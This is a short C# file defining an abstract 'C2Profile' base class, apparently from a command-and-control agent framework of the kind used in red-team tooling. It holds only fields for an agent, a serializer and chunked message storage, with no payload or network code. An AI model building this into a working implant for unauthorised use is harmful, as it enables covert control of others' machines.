using System.Collections.Generic;
using AgInterop.Interfaces;
using System.Collections.Concurrent;
using AgInterop.Structs.AgCoreStructs;
using AgInterop.Classes.Core;

namespace AgInterop.Classes
{
    public abstract class C2Profile
    {
        protected const int MAX_RETRIES = 10;
        protected ISerializer Serializer;
        protected IAgent Agent;
        protected bool Connected = false;
        protected ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        public C2Profile(Dictionary<string, string> parameters, ISerializer serializer, IAgent agent)
        {
            Agent = agent;
            Serializer = serializer;
        }
    }
}
